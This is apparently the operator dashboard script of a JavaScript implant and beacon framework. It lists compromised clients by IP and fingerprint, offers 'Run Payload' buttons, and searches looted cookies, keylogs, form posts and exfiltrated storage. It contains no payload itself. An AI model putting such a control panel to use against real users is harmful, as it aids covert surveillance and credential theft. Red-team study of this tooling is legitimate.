	detailCardStack.classList.remove('ghost-loot');

	while (detailCardStack.firstChild)
	{
		detailCardStack.firstChild.remove();
	}

	// Clear tools stack
	var toolsStack = document.getElementById('tools-stack');
	if (toolsStack) {
		while (toolsStack.firstChild) toolsStack.firstChild.remove();
		toolsStack.style.display = 'none';
	}

	removeBeaconHeaderToggle();

	// Unselect client cards
	clientCardStack = document.getElementById('client-stack');
	var cards = clientCardStack.querySelectorAll('.card');
	for (let i = 0; i < cards.length; i++)
	{
		cards[i].classList.remove("table-active");
	}
}


function switchBexTab(tab) {
	activeBexTab = tab;
	var detailStack = document.getElementById('detail-stack');
	var toolsStack = document.getElementById('tools-stack');
	var toolbarButtons = document.getElementById('loot-toolbar-buttons');

	if (tab === 'tools') {
		detailStack.style.display = 'none';
		toolsStack.style.display = '';
		if (toolbarButtons) toolbarButtons.style.display = 'none';
	} else {
		detailStack.style.display = '';
		toolsStack.style.display = 'none';
		if (toolbarButtons) toolbarButtons.style.display = '';
	}
}


function setupBeaconHeaderToggle(label) {
	var headerArea = document.getElementById('loot-header-area');
	var headerText = document.getElementById('loot-header-text');
	if (!headerArea) return;

	// Update the plain text label
	if (headerText) {
		headerText.innerHTML = '<b>&nbsp;&nbsp;' + label + '</b>';
		headerText.style.display = '';
	}

	// Don't recreate if already present
	if (document.getElementById('bex-loot-tools-toggle')) {
		// Just ensure correct radio is checked
		var lootRadio = document.getElementById('toggleLootTab');
		var toolsRadio = document.getElementById('toggleToolsTab');
		if (lootRadio) lootRadio.checked = (activeBexTab === 'loot');
		if (toolsRadio) toolsRadio.checked = (activeBexTab === 'tools');
		return;
	}

	var toggleGroup = document.createElement('div');
	toggleGroup.id = 'bex-loot-tools-toggle';
	toggleGroup.className = 'btn-group';
	toggleGroup.setAttribute('role', 'group');
	toggleGroup.setAttribute('aria-label', 'Loot Tools Toggle');
	toggleGroup.style.marginTop = '6px';

	toggleGroup.innerHTML = `
		<input type="radio" class="btn-check" name="lootToolsToggle" id="toggleLootTab" autocomplete="off" ${activeBexTab === 'loot' ? 'checked' : ''}>
		<label class="btn btn-type-toggle btn-sm" for="toggleLootTab">Loot</label>
		<input type="radio" class="btn-check" name="lootToolsToggle" id="toggleToolsTab" autocomplete="off" ${activeBexTab === 'tools' ? 'checked' : ''}>
		<label class="btn btn-type-toggle btn-sm" for="toggleToolsTab">Tools</label>
	`;

	headerArea.appendChild(toggleGroup);

	document.getElementById('toggleLootTab').addEventListener('click', function() { switchBexTab('loot'); });
	document.getElementById('toggleToolsTab').addEventListener('click', function() { switchBexTab('tools'); });

	// Enforce current tab state
	switchBexTab(activeBexTab);
}


function removeBeaconHeaderToggle() {
	var toggle = document.getElementById('bex-loot-tools-toggle');
	if (toggle) toggle.remove();

	var headerText = document.getElementById('loot-header-text');
	if (headerText) headerText.style.display = '';

	activeBexTab = 'loot';

	// Reset visibility
	var detailStack = document.getElementById('detail-stack');
	var toolsStack = document.getElementById('tools-stack');
	var toolbarButtons = document.getElementById('loot-toolbar-buttons');
	if (detailStack) detailStack.style.display = '';
	if (toolsStack) toolsStack.style.display = 'none';
	if (toolbarButtons) toolbarButtons.style.display = '';
}


function getActiveClientType() {
    if (document.getElementById('toggleBrowsers').checked) return 'browsers';
    if (document.getElementById('toggleElectrons').checked) return 'electrons';
    if (document.getElementById('toggleNodes').checked) return 'nodes';
    return 'apps';
}


function parseDate(dateString)
{
	return new Date(dateString);
}



// Sort client json based on current sorting config
function sortClients(clientsJson)
{
	// console.log("Top of clients sort...");

	// We need to get the sorting settings

	var button = document.getElementById("firstSeenAscending");

	var firstSeenAscending  = document.getElementById("firstSeenAscending").checked;
	var firstSeenDescending = document.getElementById("firstSeenDescending").checked;
	var lastSeenAscending   = document.getElementById("lastSeenAscending").checked;
	var lastSeenDescending  = document.getElementById("lastSeenDescending").checked;

	if (firstSeenAscending == true)
	{
		// console.log("** First Seen Ascending");
		// Default database ordering
		return clientsJson;
	}
	else if (firstSeenDescending == true)
	{
		// console.log("** First Seen Descending");

		// Reverse database ordering
		const reversedClients = clientsJson.reverse();
		return reversedClients;
	}
	else if (lastSeenAscending == true)
	{
		// console.log("** Last Seen Ascending");

		const sortedClients = clientsJson.sort((a, b) => parseDate(a.lastSeen) - parseDate(b.lastSeen));

		// for (let i = 0; i < sortedClients.length; i++)
		// {
		// 	console.log("i: " + i + ", last seen: " + sortedClients[i].lastSeen + ", converted: " + humanized_time_span(sortedClients[i].lastSeen));
		// }
		return sortedClients;
	}
	else if (lastSeenDescending == true)
	{
		// console.log("** Last Seen Descending");

		const sortedClients = clientsJson.sort((a, b) => parseDate(a.lastSeen) - parseDate(b.lastSeen));

		// for (let i = 0; i < sortedClients.length; i++)
		// {
		// 	console.log("i: " + i + ", last seen: " + sortedClients[i].lastSeen + ", converted: " + humanized_time_span(sortedClients[i].lastSeen));
		// }

		sortedClients.reverse();
		return sortedClients;
	}
	else
	{
		console.log("!!!!! Error, shouldn't be here in sortClients...");
	}
}


function filterClients(clientsJson)
{
	var searchBar  = document.getElementById('searchClientInput');
	var rawQuery   = searchBar.value.trim();

	if (!rawQuery) return clientsJson;

	// Split on && to get individual terms, each can be negated with leading !
	var terms = rawQuery.split('&&').map(function(t) {
		t = t.trim().toLowerCase();
		if (!t) return null;
		var negate = false;
		if (t.charAt(0) === '!') {
			negate = true;
			t = t.slice(1).trim();
		}
		return t ? { term: t, negate: negate } : null;
	}).filter(Boolean);

	if (terms.length === 0) return clientsJson;

	for (let i = clientsJson.length - 1; i >= 0; i--)
	{
		var c = clientsJson[i];
		// Build searchable string from all client fields
		var haystack = [
			c.tag, c.nickname, c.ip,
			c.fingerprint || '',
			c.platform, c.browser,
			c.clientType || '',
			c.domain || '',
			c.uuid || ''
		].join(' ').toLowerCase();

		var keep = true;
		for (var j = 0; j < terms.length; j++) {
			var found = haystack.indexOf(terms[j].term) !== -1;
			if (terms[j].negate ? found : !found) {
				keep = false;
				break;
			}
		}

		if (!keep) clientsJson.splice(i, 1);
	}

	return clientsJson;
}



// Throttle helper: ensures a function is only called at most once every delay milliseconds.
function throttle(func, delay) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall < delay) {
      return;
    }
    lastCall = now;
    return func(...args);
  };
}


const throttledUpdateClients = throttle(() => {
  clientLoadExtraCount += clientIncrementAmount;
  updateClients();
}, 2000);





async function updateClients()
{
	// Don't rebuild the client list while the user is editing a nickname inline
	if (document.querySelector('.nickname-edit-input')) return;

	updateClientFilterDot();

	console.log("Updating clients...");
	// Get client info
	var req         = await fetch('/api/getClients');
	var clientsJson = await req.json();

	var fingerprintReq  = await fetch('/api/app/getShowFingerprintSetting');
	var fingerprintJson = await fingerprintReq.json();

    // Update Navbar Stats
    const appCount = clientsJson.filter(c => c.clientType === 'js-implant' || (!c.clientType)).length;
    const browserCount = clientsJson.filter(c => c.clientType === 'bex-beacon').length;
    const electronCount = clientsJson.filter(c => c.clientType === 'atom-beacon').length;
    const nodeCount = clientsJson.filter(c => c.clientType === 'v8-beacon').length;
    const statsEl = document.getElementById('client-stats');
    if (statsEl) {
        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b> &nbsp;|&nbsp; Electrons: <b>${electronCount}</b> &nbsp;|&nbsp; Nodes: <b>${nodeCount}</b>`;

        // Detect new arrivals (skip first load when _prev is -1)
        var newApp = _prevAppCount >= 0 && appCount > _prevAppCount;
        var newBrowser = _prevBrowserCount >= 0 && browserCount > _prevBrowserCount;
        var newElectron = _prevElectronCount >= 0 && electronCount > _prevElectronCount;
        var newNode = _prevNodeCount >= 0 && nodeCount > _prevNodeCount;
        if (newApp || newBrowser || newElectron || newNode) {
            // Animate stats
            statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser', 'stats-flash-electron');
            void statsEl.offsetWidth; // force reflow to restart animation
            statsEl.classList.add(newApp ? 'stats-flash-app' : newBrowser ? 'stats-flash-browser' : 'stats-flash-electron');
            statsEl.addEventListener('animationend', function handler() {
                statsEl.classList.remove('stats-pulse', 'stats-flash-app', 'stats-flash-browser', 'stats-flash-electron');
                statsEl.removeEventListener('animationend', handler);
            });

            // Play chime
            if (newApp) playChime('app');
            else playChime('browser'); // reuse browser chime for electrons and nodes
        }
        _prevAppCount = appCount;
        _prevBrowserCount = browserCount;
        _prevElectronCount = electronCount;
        _prevNodeCount = nodeCount;
    }

	// Start setting up the client cards
	var cardStack = document.getElementById('client-stack');




	// First clear out our existing cards
	while (cardStack.firstChild)
	{
		cardStack.firstChild.remove();
	}

	// Add our top observer for lazy loading
	var topObserverElement = document.createElement('div');
	topObserverElement.setAttribute("id", "topScrollObserver");
	topObserverElement.style.minHeight = "1px";
	topObserverElement.style.flexShrink = "0";
	cardStack.appendChild(topObserverElement);


	// Sort the clients
	var jsonResponse = await sortClients(clientsJson);

    const activeType = getActiveClientType();

    // Always show loot options button (sort applies to both app and browser loot)

    // Auto-Select Logic: When switching types, load the last selected client of that type
    // Use loose equality (==) because selectedClientId may be a string from getAttribute
    // while lastSelected*Id may be a number from JSON
    if (activeType === 'browsers') {
        if (selectedClientId != lastSelectedBrowserId) {
            selectedClientId = lastSelectedBrowserId;
            if (selectedClientId) getClientDetails(selectedClientId);
        }
    } else if (activeType === 'electrons') {
        if (selectedClientId != lastSelectedElectronId) {
            selectedClientId = lastSelectedElectronId;
            if (selectedClientId) getClientDetails(selectedClientId);
        }
    } else if (activeType === 'nodes') {
        if (selectedClientId != lastSelectedNodeId) {
            selectedClientId = lastSelectedNodeId;
            if (selectedClientId) getClientDetails(selectedClientId);
        }
    } else {
        if (selectedClientId != lastSelectedAppId) {
            selectedClientId = lastSelectedAppId;
            if (selectedClientId) getClientDetails(selectedClientId);
        }
    }

    // Auto-refresh detail view if a beacon is selected (to update injection status)
    if (selectedClientId && !refreshingDetails) {
        const selectedClient = clientsJson.find(c => c.id == selectedClientId);
        if (selectedClient && (selectedClient.clientType === 'bex-beacon' || selectedClient.clientType === 'atom-beacon' || selectedClient.clientType === 'v8-beacon')) {
            getClientDetails(selectedClientId, true);
        }
    }

	// We need to filter the clients here too
	jsonResponse = filterClients(jsonResponse);

    // Handle Loot Header based on Selected Client
    const lootHeader = document.getElementById('loot-header-text');

    if (activeType === 'browsers') {
        setupBeaconHeaderToggle('Browser');
    } else if (activeType === 'electrons') {
        setupBeaconHeaderToggle('Electron');
    } else if (activeType === 'nodes') {
        setupBeaconHeaderToggle('Node');
    } else {
        // If an App client is selected, keep the Loot/Tools toggle; otherwise plain label
        if (selectedClientId) {
            setupBeaconHeaderToggle('App');
        } else {
            removeBeaconHeaderToggle();
            if (lootHeader) lootHeader.innerHTML = '<b>&nbsp;&nbsp;App Loot</b>';
        }
    }

	var topCount = parseInt(clientLoadCount) + parseInt(clientLoadExtraCount);

	// console.log("$$$$ From: " + 0 + ", to: " + topCount);
	if (topCount > jsonResponse.length)
	{
		topCount = jsonResponse.length;
	}
	// console.log("$$$$ From: " + 0 + ", to: " + topCount);

	// let's layout our clients
	for (let i = 0; i < topCount; i++)
	{
		client = jsonResponse[i];

		// Filter by client type toggle
		const activeType2 = getActiveClientType();
		if (activeType2 === 'browsers' && client.clientType !== 'bex-beacon') continue;
		if (activeType2 === 'electrons' && client.clientType !== 'atom-beacon') continue;
		if (activeType2 === 'nodes' && client.clientType !== 'v8-beacon') continue;
		if (activeType2 === 'apps' && (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon')) continue;

		if (document.getElementById('onlyStarredClients').checked == true)
		{
			if (!client.isStarred)
			{
				if (client.id == selectedClientId)
				{
					// need to unselect the client before we hide it
					unselectAllClients();
				}
				continue;
			}
			else
			{
				console.log("Filtering stars, client passes check: " + client.nickname);
			}
		}


		var card = document.createElement('div');
		card.className = 'card';
		card.setAttribute("clientIndex", client.id);
		card.setAttribute("id", "clientCard" + client.id);

		// On refresh, see if we were the previously
		// selected client and re-select

		// console.log("Selected ID: " + selectedClientId + ", current client id: " + client.id);
		if (client.id == selectedClientId)
		{
			card.classList.add("table-active");
		}


		var cardBody = document.createElement('div');
		cardBody.className = 'card-body';

		var cardTitle = document.createElement('h5');
		cardTitle.className = "card-title";

		var cardSubtitle = document.createElement('h6');

		// Add tooltip
		cardSubtitle.className = "card-subtitle mb-2 text-muted";
		cardSubtitle.setAttribute("data-toggle", "tooltip")
		cardSubtitle.setAttribute("title", "Last Update: " + client.lastSeen);
		cardSubtitle.setAttribute("data-placement", "left");
		const tooltipOptions = {
    	animation: true, // Optional: Enable tooltip animation
      delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
      container: cardSubtitle // Optional: Specify a container for the tooltip
  };
  new bootstrap.Tooltip(cardSubtitle, tooltipOptions);


  var cardText = document.createElement('p');
  cardText.className = 'card-text';

  var clientName = "";
  if (client.tag != "")
  {
  	clientName = escapeHTML(client.tag) + "/" + escapeHTML(client.nickname);
  }
  else
  {
  	clientName = escapeHTML(client.nickname);
  }

  var pencilSvg = '<span style="cursor:pointer;opacity:0.6;" onclick="showNicknameEditor(event, \'' + escapeHTML(client.id) + '\')"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="currentColor" viewBox="0 0 16 16"><path d="M12.146.146a.5.5 0 0 1 .708 0l3 3a.5.5 0 0 1 0 .708l-10 10a.5.5 0 0 1-.168.11l-5 2a.5.5 0 0 1-.65-.65l2-5a.5.5 0 0 1 .11-.168l10-10zM11.207 2.5 13.5 4.793 14.793 3.5 12.5 1.207 11.207 2.5zm1.586 3L10.5 3.207 4 9.707V10h.5a.5.5 0 0 1 .5.5v.5h.5a.5.5 0 0 1 .5.5v.5h.293l6.5-6.5zm-9.761 5.175-.106.106-1.528 3.821 3.821-1.528.106-.106A.5.5 0 0 1 5 12.5V12h-.5a.5.5 0 0 1-.5-.5V11h-.5a.5.5 0 0 1-.468-.325z"/></svg></span>';

  var starIcon = client.isStarred
    ? '<img src="/protectedStatic/star-fill.svg" style="cursor:pointer;" onclick="toggleStarFromStore(this, event, \'' + escapeHTML(client.id) + '\')">'
    : '<img src="/protectedStatic/star.svg" style="cursor:pointer;" onclick="toggleStarFromStore(this, event, \'' + escapeHTML(client.id) + '\')">';

  var blockIcon = '<img src="/protectedStatic/x-circle.svg" style="cursor:pointer;" onclick="blockClientFromStore(this, event, \'' + escapeHTML(client.id) + '\')">';

  cardTitle.innerHTML = '<span class="client-name" title="' + clientName + '"><u>' + clientName + '</u></span>'
    + '<span class="client-card-actions">' + pencilSvg + blockIcon + starIcon + '</span>';

  // Store client data for safe onclick lookups
  _clientData[client.id] = { nickname: client.nickname, notes: client.notes };

  cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.ip) + "</b>";


	//What to do about client notes?
  if (client.notes.length > 0)
  {
  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick="showNoteEditorFromStore(event, \'' + escapeHTML(client.id) + '\')">Edit Notes</button>';
  }
  else
  {
  	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick="showNoteEditorFromStore(event, \'' + escapeHTML(client.id) + '\')">Add Notes</button>';
  }

  // Optional display of fingerprints, turned on in app settings and an option in the payload
  if (fingerprintJson.fingerprintEnabled)
  {
  	cardText.innerHTML += "<br>Fingerprint:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.fingerprint) + "</b>";
  }

  cardText.innerHTML += "<br>Platform:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.platform) + "</b><br>";
  cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + escapeHTML(client.browser) + "</b>";

  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon' && client.clientType !== 'v8-beacon') {
    if (client.hasJobs)
    {
      cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;border-width:2px;border-color:green" onclick=showSingleClientPayloadModal(event,' + `'` 
      + client.id + `'`+ ')>Run Payload</button>';  
    }	
    else
    {
      cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
      + client.id + `'`+ ')>Run Payload</button>';
    }
  }


  cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
  cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";

  if (client.clientType !== 'bex-beacon' && client.clientType !== 'atom-beacon' && client.clientType !== 'v8-beacon' && client.domain) {
      cardSubtitle.innerHTML += "<br>Domain: <b>" + escapeHTML(client.domain) + "</b>";
  }

  cardBody.appendChild(cardTitle);
  cardBody.appendChild(cardSubtitle);
  cardBody.appendChild(cardText);

  // Add child client summary if it's a beacon
  if (client.clientType === 'bex-beacon' || client.clientType === 'atom-beacon' || client.clientType === 'v8-beacon') {
      const myChildren = clientsJson.filter(c => c.parentUUID === client.uuid);
      if (myChildren.length > 0) {
          var childrenDiv = document.createElement('div');
          childrenDiv.className = 'mt-2 border-top pt-2';
          childrenDiv.innerHTML = `<small class="text-muted">Spawned Implants:</small>`;
          
          myChildren.forEach(child => {
              var childBadge = document.createElement('div');
              childBadge.className = 'badge bg-dark text-white me-1 p-1';
              childBadge.style.cursor = 'pointer';
              const name = child.tag ? `${escapeHTML(child.tag)}/${escapeHTML(child.nickname)}` : escapeHTML(child.nickname);
              childBadge.innerHTML = `<small>${name}</small>`;
              childBadge.onclick = (e) => {
                  e.stopPropagation();
                  // Select this child
                  // First ensure we are showing Apps
                  document.getElementById('toggleApps').click();
                  
                  // Wait for update to finish then click
                  setTimeout(() => {
                      const childCard = document.getElementById('clientCard' + child.id);
                      if (childCard) childCard.click();
                  }, 100);
              };
              childrenDiv.appendChild(childBadge);
          });
          cardBody.appendChild(childrenDiv);
      }
  } else if (client.parentUUID) {
      // Add "Spawned By" link for child implants
      const parent = clientsJson.find(c => c.uuid === client.parentUUID);
      if (parent) {
          var parentDiv = document.createElement('div');
          parentDiv.className = 'mt-2 border-top pt-2';
          parentDiv.innerHTML = `<small class="text-muted">Spawned By:</small> `;
          
          var parentBadge = document.createElement('div');
          parentBadge.className = 'badge bg-info text-dark p-1';
          parentBadge.style.cursor = 'pointer';
          const name = parent.tag ? `${escapeHTML(parent.tag)}/${escapeHTML(parent.nickname)}` : escapeHTML(parent.nickname);
          parentBadge.innerHTML = `<small>${name}</small>`;
          parentBadge.onclick = (e) => {
              e.stopPropagation();
              // Switch to Browsers
              document.getElementById('toggleBrowsers').click();
              
              // Wait for update then click parent
              setTimeout(() => {
                  const parentCard = document.getElementById('clientCard' + parent.id);
                  if (parentCard) parentCard.click();
              }, 100);
          };
          parentDiv.appendChild(parentBadge);
          cardBody.appendChild(parentDiv);
      }
  }

  card.appendChild(cardBody);

  card.onclick =  function(event) {
    	// Ignore clicks on action icons (pencil/star/block) or any button/input (nickname editor, notes, payload)
    	var target = event.target;
    	if (target.closest('.client-card-actions') || target.closest('button') || target.closest('input')) return;
  	unselectAllClients();
  	clickedClient = this.getAttribute("clientIndex");
  	this.classList.add("table-active");
  	selectedClientId = clickedClient;
  	getClientDetails(selectedClientId);
  };

  cardStack.appendChild(card);    	
  }



var bottomObserverElement = document.createElement('div');
bottomObserverElement.style.minHeight = "1px";
bottomObserverElement.style.flexShrink = "0";
bottomObserverElement.setAttribute("id", "bottomScrollObserver");
cardStack.appendChild(bottomObserverElement);



let isLoading    = false;
let bottomInView = false;

let loadMoreTrigger     = document.getElementById('bottomScrollObserver');
let loadPrevioustrigger = document.getElementById('topScrollObserver');


// Observer for scrolling back up to the top of client list
const topObserver = new IntersectionObserver((entries, observer) => {
	entries.forEach(entry => {
		if (entry.isIntersecting && !isLoading && !bottomInView) {
			isLoading = true;
			//console.log("-*-*-*-*- Time to reset extra count!");
			clientLoadExtraCount = 0;
			// updateClients();
			isLoading = false;
		}
	});
}, {
	root: cardStack,
  threshold: 0.1  // Adjust threshold as needed
});





// Observer for scrolling to bottom of client list
const bottomObserver = new IntersectionObserver((entries, observer) => {
	for (const entry of entries) {
		bottomInView = entry.isIntersecting;
		if (entry.isIntersecting && !isLoading) {
			isLoading = true;
			// console.log("@@@@@@ Time to load more!");
			clientLoadExtraCount += clientIncrementAmount;
			// If the bottom is in view we can't just keep calling updateClients, it clobbers things
			throttledUpdateClients();
			isLoading = false;
		}
	}
}, {
	root: cardStack,
  threshold: 0.1  // Adjust threshold as needed
});



// Disconnect our observers used for lazy loading
if (topObserver) 
{
  topObserver.disconnect();
}
if (bottomObserver) 
{
  bottomObserver.disconnect();
}


bottomObserver.observe(loadMoreTrigger);
topObserver.observe(loadPrevioustrigger);

// End update clients
}


// ===== Loot Search =====

var _lootSearchModal = null;

function showLootSearchModal()
{
	if (!_lootSearchModal) {
		_lootSearchModal = new bootstrap.Modal(document.getElementById('lootSearchModal'));
	}
	// Reset to defaults: all checkboxes checked
	lootSearchSelectAll();
	document.getElementById('lootSearchResults').innerHTML = '';
	document.getElementById('lootSearchSummary').style.display = 'none';
	document.getElementById('lootSearchPagination').innerHTML = '';
	_lootSearchModal.show();
	setTimeout(function() { document.getElementById('lootSearchQuery').focus(); }, 300);
}

function lootSearchSelectAll()
{
	var boxes = document.querySelectorAll('.loot-search-evt');
	boxes.forEach(function(cb) { cb.checked = true; });
}

function lootSearchSelectNone()
{
	var boxes = document.querySelectorAll('.loot-search-evt');
	boxes.forEach(function(cb) { cb.checked = false; });
}

function executeLootSearch(page)
{
	var clientFilter = document.getElementById('lootSearchClientFilter').value;
	var searchQuery  = document.getElementById('lootSearchQuery').value;
	var eventTypes   = [];
	document.querySelectorAll('.loot-search-evt:checked').forEach(function(cb) {
		eventTypes.push(cb.value);
	});

	var resultsDiv = document.getElementById('lootSearchResults');
	var summaryDiv = document.getElementById('lootSearchSummary');
	resultsDiv.innerHTML = '<div class="text-center text-muted py-3">Searching...</div>';
	summaryDiv.style.display = 'none';
	document.getElementById('lootSearchPagination').innerHTML = '';

	fetch('/api/lootSearch', {
		method: 'POST',
		headers: { 'Content-Type': 'application/json' },
		body: JSON.stringify({
			clientFilter: clientFilter,
			searchQuery: searchQuery,
			eventTypes: eventTypes,
			sortOrder: document.getElementById('lootSearchSortOrder').value,
			page: page || 1
		})
	})
	.then(function(resp) { return resp.json(); })
	.then(function(data) { renderLootSearchResults(data); })
	.catch(function(err) {
		resultsDiv.innerHTML = '<div class="text-danger">Search failed: ' + err.message + '</div>';
	});
}

var _lootSearchBadgeColors = {
	'USERINPUT': 'secondary',
	'FORMPOST': 'danger',
	'COOKIE': 'info',
	'LOCALSTORAGE': 'secondary',
	'SESSIONSTORAGE': 'secondary',
	'URLVISITED': 'primary',
	'XHRAPICALL': 'dark',
	'FETCHAPICALL': 'dark',
	'CUSTOMEXFIL': 'light',
	'PLUGIN': 'info',
	'KEYLOG': 'warning',
	'BEACON_CAPTURE': 'success',
	'BEACON_VISIT': 'primary'
};

var _lootSearchTypeLabels = {
	'USERINPUT': 'Input',
	'FORMPOST': 'Form',
	'COOKIE': 'Cookie',
	'LOCALSTORAGE': 'LocalStorage',
	'SESSIONSTORAGE': 'SessionStorage',
	'URLVISITED': 'URL',
	'XHRAPICALL': 'XHR',
	'FETCHAPICALL': 'Fetch',
	'CUSTOMEXFIL': 'Custom Exfil',
	'PLUGIN': 'Plugin',
	'KEYLOG': 'Keylog',
	'BEACON_CAPTURE': 'Beacon Capture',
	'BEACON_VISIT': 'Beacon Visit'
};

function escapeHtmlSearch(str)
{
	var div = document.createElement('div');
	div.appendChild(document.createTextNode(str));
	return div.innerHTML;
}

function renderLootSearchResults(data)
{
	var resultsDiv = document.getElementById('lootSearchResults');
	var summaryDiv = document.getElementById('lootSearchSummary');
	var paginationDiv = document.getElementById('lootSearchPagination');

	resultsDiv.innerHTML = '';
	paginationDiv.innerHTML = '';

	if (data.total === 0) {
		resultsDiv.innerHTML = '<div class="text-muted text-center py-3">No results found.</div>';
		summaryDiv.style.display = 'none';
		return;
	}

	// Summary
	var start = (data.page - 1) * 50 + 1;
	var end   = Math.min(data.page * 50, data.total);
	summaryDiv.textContent = data.total + ' results, showing ' + start + '-' + end + ' (sorted: ' + (data.sortOrder || 'unknown') + ')';
	summaryDiv.style.display = 'block';

	// Render result cards
	for (var i = 0; i < data.results.length; i++) {
		var r = data.results[i];
		var badgeColor = _lootSearchBadgeColors[r.eventType] || 'secondary';
		var typeLabel  = _lootSearchTypeLabels[r.eventType] || r.eventType;

		var card = document.createElement('div');
		card.className = 'card bg-dark text-light mb-2';
		card.style.borderLeft = '3px solid';

		var cardBody = document.createElement('div');
		cardBody.className = 'card-body py-2 px-3';

		// Line 1: badge + timestamp
		var line1 = '<span class="badge bg-' + badgeColor + ' me-2">' + escapeHtmlSearch(typeLabel) + '</span>';
		line1 += '<small class="text-muted">' + escapeHtmlSearch(r.timeStamp) + '</small>';

		// Line 2: client info
		var clientLabel = '';
		if (r.clientTag) clientLabel = r.clientTag + '/';
		clientLabel += r.clientNickname;
		var clientTypeIcon = r.clientType === 'bex-beacon' ? ' [bex]' : r.clientType === 'atom-beacon' ? ' [atom]' : r.clientType === 'v8-beacon' ? ' [v8]' : '';
		var line2 = '<div><small>Client: <b>' + escapeHtmlSearch(clientLabel) + '</b>';
		if (r.clientIP) line2 += ' (' + escapeHtmlSearch(r.clientIP) + ')';
		line2 += escapeHtmlSearch(clientTypeIcon) + '</small></div>';

		// Lines 3+: fields
		var fieldsHtml = '';
		var fields = r.fields || {};
		var keys = Object.keys(fields);
		for (var j = 0; j < keys.length; j++) {
			var val = fields[keys[j]] || '';
			if (val.length > 300) val = val.substring(0, 300) + '...';
			fieldsHtml += '<div><small class="text-muted">' + escapeHtmlSearch(keys[j]) + ':</small> <span style="font-family:monospace;color:#fff;">' + escapeHtmlSearch(val) + '</span></div>';
		}

		cardBody.innerHTML = line1 + line2 + fieldsHtml;
		card.appendChild(cardBody);
		resultsDiv.appendChild(card);
	}

	// Pagination
	if (data.pages > 1) {
		var prevBtn = document.createElement('button');
		prevBtn.className = 'btn btn-sm btn-outline-secondary';
		prevBtn.textContent = 'Prev';
		prevBtn.disabled = (data.page <= 1);
		prevBtn.onclick = function() { executeLootSearch(data.page - 1); };

		var pageText = document.createElement('span');
		pageText.className = 'text-muted';
		pageText.textContent = 'Page ' + data.page + ' of ' + data.pages;

		var nextBtn = document.createElement('button');
		nextBtn.className = 'btn btn-sm btn-outline-secondary';
		nextBtn.textContent = 'Next';
		nextBtn.disabled = (data.page >= data.pages);
		nextBtn.onclick = function() { executeLootSearch(data.page + 1); };

		paginationDiv.appendChild(prevBtn);
		paginationDiv.appendChild(pageText);
		paginationDiv.appendChild(nextBtn);
	}
}

// Allow Enter key to trigger search in the modal inputs
document.addEventListener('DOMContentLoaded', function() {
	var searchInputs = ['lootSearchQuery', 'lootSearchClientFilter'];
	searchInputs.forEach(function(id) {
		var el = document.getElementById(id);
		if (el) {
			el.addEventListener('keydown', function(e) {
				if (e.key === 'Enter') {
					e.preventDefault();
					executeLootSearch(1);
				}
			});
		}
	});
});





updateClients();


